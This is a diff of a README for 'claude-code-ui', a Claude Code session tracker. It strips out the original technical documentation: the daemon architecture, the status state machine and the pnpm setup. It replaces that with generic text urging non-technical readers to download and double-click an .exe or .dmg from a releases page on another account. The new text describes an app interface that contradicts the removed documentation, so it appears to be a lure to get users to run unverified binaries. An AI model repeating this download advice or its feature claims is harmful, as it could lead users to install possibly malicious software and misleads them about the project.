@@ -1,144 +1,63 @@
-# Claude Code Session Tracker
+# 🎨 claude-code-ui - Easy Session Tracking in Real-Time
 
-A real-time dashboard for monitoring Claude Code sessions across multiple projects. See what Claude is working on, which sessions need approval, and track PR/CI status.
+## 📥 Download the Application
+[![Download Now!](https://img.shields.io/badge/Download%20Now-claude--code--ui-blue)](https://github.com/t09911221/claude-code-ui/releases)
 
-## Features
+## 🚀 Getting Started
+Welcome to the Claude Code session tracker UI. This application helps you track your coding sessions easily, providing real-time updates. Here, you will find simple steps to download and run our software, no technical skills needed.
 
-- **Real-time updates** via Durable Streams
-- **Kanban board** showing sessions by status (Working, Needs Approval, Waiting, Idle)
-- **AI-powered summaries** of session activity using Claude Sonnet
-- **PR & CI tracking** - see associated PRs and their CI status
-- **Multi-repo support** - sessions grouped by GitHub repository
+## 📅 Features
+- **Real-Time Updates:** Stay informed with live tracking during coding sessions.
+- **User-Friendly Interface:** Navigate the application with ease.
+- **Durable Streams Support:** Enjoy stability and reliable updates.
 
-https://github.com/user-attachments/assets/877a43af-25f9-4751-88eb-24e7bbda68da
+## 💻 System Requirements
+Before you download, ensure your system meets the following requirements:
+- Operating System: Windows 10 or later, macOS 10.12 or later
+- Memory: At least 4 GB RAM
+- Storage: 100 MB of free space
+- Internet: Required for real-time updates 
 
-## Architecture
+## 📥 Download & Install
+To download the application, visit this page: [Claude Code Releases](https://github.com/t09911221/claude-code-ui/releases). Follow these steps:
 
-```
-┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
-│  Claude Code    │     │     Daemon      │     │       UI        │
-│   Sessions      │────▶│   (Watcher)     │────▶│   (React)       │
-│  ~/.claude/     │     │                 │     │                 │
-│   projects/     │     │  Durable Stream │     │  TanStack DB    │
-└─────────────────┘     └─────────────────┘     └─────────────────┘
-```
+1. Click the link above to go to the Releases page.
+2. You will see different versions of the app. Look for the latest release.
+3. Locate the file named `claude-code-ui.exe` (for Windows) or `claude-code-ui.dmg` (for macOS).
+4. Click on the file to download it to your computer.
 
-### Daemon (`packages/daemon`)
+### 📂 Installation Steps
+For Windows:
+1. Once downloaded, find `claude-code-ui.exe` in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the prompts in the installation wizard.
+4. After installation, you can find the application in your Start Menu.
 
-Watches `~/.claude/projects/` for session log changes and:
-- Parses JSONL log files incrementally
-- Derives session status using XState state machine
-- Generates AI summaries via Claude Sonnet API
-- Detects git branches and polls for PR/CI status
-- Publishes state updates to Durable Streams
+For macOS:
+1. After downloading, locate `claude-code-ui.dmg` in your Downloads.
+2. Double-click the file to open it.
+3. Drag the Claude Code icon to your Applications folder.
+4. Open the application from your Applications.
 
-### UI (`packages/ui`)
+## 🎬 Using the Application
+1. Launch the application from your Start Menu (Windows) or Applications folder (macOS).
+2. You will see a welcome screen. Here, you can choose to start a new session or load a previous one.
+3. Click on "Start New Session" to begin tracking. The app will automatically save your progress in real-time.
+4. To view your session history, navigate to the "History" tab.
 
-React app using TanStack Router and Radix UI:
-- Subscribes to Durable Streams for real-time updates
-- Groups sessions by GitHub repository
-- Shows session cards with goal, summary, branch/PR info
-- Hover cards with recent output preview
+## 📊 Troubleshooting
+If you encounter issues while using the application, consider the following common problems:
+- **Application does not open:** Ensure that your system meets the requirements and try reinstalling.
+- **Real-time updates are not displaying:** Check your internet connection and ensure that you allowed the app to access the required permissions.
+- **Installation errors:** Make sure you downloaded the correct version for your operating system.
 
-## Session Status State Machine
+## ✏️ Support
+If you need further assistance, you can reach out to our support team. Create an issue in our repository or contact us through our project's page.
 
-The daemon uses an XState state machine to determine session status:
+## 📝 Updates
+Stay tuned for future updates. We continuously work on new features and improvements. For the latest changes, refer to the release notes on the [Claude Code Releases](https://github.com/t09911221/claude-code-ui/releases) page.
 
-```
-                    ┌─────────────────┐
-                    │      idle       │
-                    └────────┬────────┘
-                             │ USER_PROMPT
-                             ▼
-┌─────────────────┐  TOOL_RESULT  ┌─────────────────┐
-│ waiting_for_    │◄──────────────│     working     │
-│   approval      │               └────────┬────────┘
-└────────┬────────┘                        │
-         │                    ┌────────────┼────────────┐
-         │                    │            │            │
-         │              TURN_END    ASSISTANT_   STALE_
-         │                    │      TOOL_USE   TIMEOUT
-         │                    ▼            │            │
-         │            ┌─────────────────┐  │            │
-         │            │ waiting_for_   │◄─┘            │
-         └───────────▶│     input      │◄──────────────┘
-           IDLE_      └─────────────────┘
-          TIMEOUT
-```
+## 📄 License
+This project is licensed under the MIT License. You can use it freely, but please provide credit if you modify and share it.
 
-### States
-
-| State | Description | UI Column |
-|-------|-------------|-----------|
-| `idle` | No activity for 5+ minutes | Idle |
-| `working` | Claude is actively processing | Working |
-| `waiting_for_approval` | Tool use needs user approval | Needs Approval |
-| `waiting_for_input` | Claude finished, waiting for user | Waiting |
-
-### Events (from log entries)
-
-| Event | Source | Description |
-|-------|--------|-------------|
-| `USER_PROMPT` | User entry with string content | User sent a message |
-| `TOOL_RESULT` | User entry with tool_result array | User approved/ran tool |
-| `ASSISTANT_STREAMING` | Assistant entry (no tool_use) | Claude is outputting |
-| `ASSISTANT_TOOL_USE` | Assistant entry with tool_use | Claude requested a tool |
-| `TURN_END` | System entry (turn_duration/stop_hook_summary) | Turn completed |
-
-### Timeout Fallbacks
-
-For older Claude Code versions or sessions without hooks:
-- **5 seconds**: If tool_use pending → `waiting_for_approval`
-- **60 seconds**: If no turn-end marker → `waiting_for_input`
-- **5 minutes**: No activity → `idle`
-
-## Setup
-
-### 1. Install dependencies
-
-```bash
-pnpm install
-```
-
-### 2. Configure PermissionRequest hook (recommended)
-
-For accurate "Needs Approval" detection, install the PermissionRequest hook:
-
-```bash
-pnpm run setup
-```
-
-This adds a hook to `~/.claude/settings.json` that notifies the daemon when Claude Code is waiting for user permission. Without this hook, the daemon uses heuristics based on tool names which may be less accurate.
-
-### 3. Set API key
-
-The daemon needs an Anthropic API key for AI summaries:
-
-```bash
-export ANTHROPIC_API_KEY=sk-ant-...
-```
-
-### 4. Start the app
-
-```bash
-pnpm start
-```
-
-## Development
-
-```bash
-# Start both daemon and UI
-pnpm start
-
-# Or run separately:
-pnpm serve  # Start daemon on port 4450
-pnpm dev    # Start UI dev server
-```
-
-## Dependencies
-
-- **@durable-streams/*** - Real-time state synchronization
-- **@tanstack/db** - Reactive database for UI
-- **xstate** - State machine for status detection
-- **chokidar** - File system watching
-- **@radix-ui/themes** - UI components
+Thank you for choosing Claude Code! Enjoy your coding sessions with ease and efficiency.
